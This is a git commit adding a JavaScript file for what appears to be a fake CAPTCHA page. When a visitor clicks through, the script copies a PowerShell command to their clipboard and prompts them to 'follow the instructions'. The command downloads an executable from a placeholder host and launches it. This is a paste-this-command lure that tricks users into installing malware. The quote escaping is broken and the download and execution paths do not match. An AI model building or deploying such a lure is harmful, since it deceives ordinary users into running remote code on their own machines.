57b8e9088ea9df59760f533cc6fdd7345099e3ae
Lawxsz <116668706+Lawxsz@users.noreply.github.com>
2025-01-18 21:05:44 -0300

    Create script.js

---
+++ script.js
@@ -0,0 +1,15 @@
+const maliciousScript = "powershell -Command "Invoke-WebRequest -Uri 'https://example.com/file.exe' -OutFile 'C:\ruta\al\archivo\archivo.exe'; Start-Process 'C:\path\to\file\file.exe'"";
+
+document.getElementById('captchaButton').addEventListener('click', function() {
+    document.getElementById('captchaButton').style.display = 'none';
+    document.getElementById('stepsContainer').style.display = 'block';
+});
+
+document.getElementById('executeButton').addEventListener('click', function() {
+    navigator.clipboard.writeText(maliciousScript).then(() => {
+        alert('The script has been copied to the clipboard. Now follow the instructions.');
+    }).catch(err => {
+        alert('Could not copy the code to the clipboard: ' + err);
+    });
+    
+});
